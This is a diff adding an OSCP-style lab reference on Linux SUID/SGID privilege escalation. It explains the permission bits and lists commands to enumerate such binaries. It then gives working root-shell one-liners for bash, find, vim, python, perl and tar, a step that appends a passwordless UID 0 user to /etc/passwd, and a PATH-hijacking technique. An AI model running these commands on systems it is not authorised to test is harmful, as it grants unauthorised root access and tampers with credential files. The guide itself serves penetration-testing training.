@@ -1,0 +1,239 @@
+Linux SUID / SGID
+
+Privilege Escalation Reference | OSCP Lab Guide
+
+What is SUID?
+
+SUID stands for Set User ID. It is a special permission bit on a Linux
+executable that tells the OS:
+
+  -----------------------------------------------------------------------
+  “When anyone runs this file, run it as the file’s owner — not as the
+  person who executed it.”
+
+  -----------------------------------------------------------------------
+
+Most SUID binaries are owned by root, which means anyone who runs them
+temporarily gets root-level execution for the duration of that process.
+
+Why It Exists Legitimately
+
+The classic example is passwd. A regular user needs to change their own
+password, which requires writing to /etc/shadow — a root-owned file.
+Rather than giving every user root access, passwd has the SUID bit set
+and is owned by root. It executes as root just long enough to update the
+password, then exits.
+
+  -----------------------------------------------------------------------
+  $ ls -la /usr/bin/passwd
+
+  -rwsr-xr-x 1 root root ... /usr/bin/passwd
+
+  ^
+
+  s = SUID bit set (lowercase = execute bit also set)
+
+  S = SUID bit set but execute bit is NOT (broken/unusual)
+  -----------------------------------------------------------------------
+
+Why It Matters for Privesc
+
+If an admin misconfigures a binary — especially a shell, script
+interpreter, or tool that can run arbitrary commands — with SUID root,
+you can exploit it to get a root shell.
+
+-   Find SUID binaries on the target
+
+-   Identify any that are unusual or not part of the standard set
+
+-   Check GTFOBins for the exact exploitation syntax
+
+-   Execute to spawn a shell or read/write privileged files
+
+Step 1 — Find SUID Binaries
+
+  -----------------------------------------------------------------------
+  # Standard find command
+
+  find / -perm -4000 -type f 2>/dev/null
+
+  # Show owner alongside each result
+
+  find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
+
+  # WinPEAS / LinPEAS automated detection
+
+  ./linpeas.sh | grep -A 2 'SUID'
+  -----------------------------------------------------------------------
+
+  -----------------------------------------------------------------------
+  GTFOBins: https://gtfobins.github.io — catalogs every known binary and
+  how to abuse SUID. Check every unfamiliar result here.
+
+  -----------------------------------------------------------------------
+
+Step 2 — Identify What’s Unusual
+
+You’ll always see a standard list of legitimate SUID binaries (passwd,
+su, sudo, ping, mount). What you’re looking for is anything that should
+not have SUID set:
+
+  -----------------------------------------------------------------------
+  Category              Examples to look for
+  --------------------- -------------------------------------------------
+  Shell interpreters    bash, sh, zsh, dash
+
+  Text editors          vim, nano, less, more, man
+
+  File tools            cp, find, tar, zip, rsync, mv
+
+  Script runners        python, python3, perl, ruby, php, node
+
+  Network tools         nmap (older versions — had interactive mode)
+
+  Custom binaries       anything you don’t recognize in /opt, /usr/local,
+                        /home
+  -----------------------------------------------------------------------
+
+Step 3 — Exploit Examples
+
+bash has SUID
+
+  -----------------------------------------------------------------------
+  $ /bin/bash -p
+
+  # -p flag preserves effective UID (root) instead of dropping it
+
+  bash-5.1# whoami
+
+  root
+  -----------------------------------------------------------------------
+
+find has SUID
+
+  -----------------------------------------------------------------------
+  $ find . -exec /bin/sh -p \; -quit
+
+  -----------------------------------------------------------------------
+
+vim has SUID
+
+  -----------------------------------------------------------------------
+  $ vim -c ':!/bin/sh -p'
+
+  # Alternative:
+
+  $ vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec
+  sh -p")'
+  -----------------------------------------------------------------------
+
+python has SUID
+
+  -----------------------------------------------------------------------
+  $ python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+  -----------------------------------------------------------------------
+
+cp has SUID
+
+  -----------------------------------------------------------------------
+  # Add a passwordless root user to /etc/passwd
+
+  $ cp /etc/passwd /tmp/passwd_bak
+
+  $ echo 'hacker::0:0:root:/root:/bin/bash' >> /tmp/passwd_bak
+
+  $ cp /tmp/passwd_bak /etc/passwd
+
+  $ su hacker # no password required, UID 0
+  -----------------------------------------------------------------------
+
+PATH Hijacking (custom binary calls system() without full path)
+
+If a SUID binary calls system("cat /etc/hosts") without the full path
+/bin/cat, you can plant a fake cat earlier in $PATH:
+
+  -----------------------------------------------------------------------
+  $ cd /tmp
+
+  $ echo '/bin/bash -p' > cat
+
+  $ chmod +x cat
+
+  $ export PATH=/tmp:$PATH
+
+  $ /path/to/vulnerable_suid_binary
+
+  # Your fake 'cat' runs as root instead
+  -----------------------------------------------------------------------
+
+  -----------------------------------------------------------------------
+  OSCP tip: PATH hijacking is extremely common on OSCP lab boxes. Always
+  check what a suspicious SUID binary is actually calling using strings
+  or strace.
+
+  -----------------------------------------------------------------------
+
+SGID — The Sibling
+
+SGID (Set Group ID) works the same way but at the group level — the
+binary runs as the file’s group rather than its owner. Less common as a
+direct privesc but worth enumerating.
+
+  -----------------------------------------------------------------------
+  # Find SGID binaries
+
+  find / -perm -2000 -type f 2>/dev/null
+
+  # Find both SUID and SGID in one pass
+
+  find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
+  -----------------------------------------------------------------------
+
+LinPEAS Detection
+
+LinPEAS specifically highlights SUID files in its output. Look for the
+SUID section — anything highlighted in red/yellow that isn’t on the
+standard list is worth checking on GTFOBins immediately. This is one of
+the highest-yield areas of the LinPEAS output on OSCP lab boxes.
+
+  -----------------------------------------------------------------------
+  # Run LinPEAS and filter SUID results
+
+  ./linpeas.sh 2>/dev/null | grep -E 'SUID|SGID' -A 2
+
+  # Quick manual SUID check (fast, no script needed)
+
+  find / -perm -4000 -type f 2>/dev/null | xargs ls -la
+  -----------------------------------------------------------------------
+
+Quick Reference
+
+  ----------------------------------------------------------------------------
+  Binary          Exploit Command                    Notes
+  --------------- ---------------------------------- -------------------------
+  bash            /bin/bash -p                       Direct root shell
+
+  sh              /bin/sh -p                         Direct root shell
+
+  find            find . -exec /bin/sh -p \; -quit   One-liner shell
+
+  vim             vim -c ':!/bin/sh -p'              Via ex command
+
+  python3         python3 -c 'import os;             exec os shell
+                  os.execl...'                       
+
+  perl            perl -e 'exec "/bin/sh -p";'       exec shell
+
+  nmap            nmap --interactive (< v5.20)       Legacy only
+
+  cp              Overwrite /etc/passwd              Add root user
+
+  tar             tar -cf /dev/null /dev/null        Wildcard abuse
+                  --checkpoint=1                     
+                  --checkpoint-action=exec=/bin/sh   
+
+  less            !sh                                From within less
+  ----------------------------------------------------------------------------
+
+OSCP Recon Suite | gtfobins.github.io | Generated by oscp_recon.py
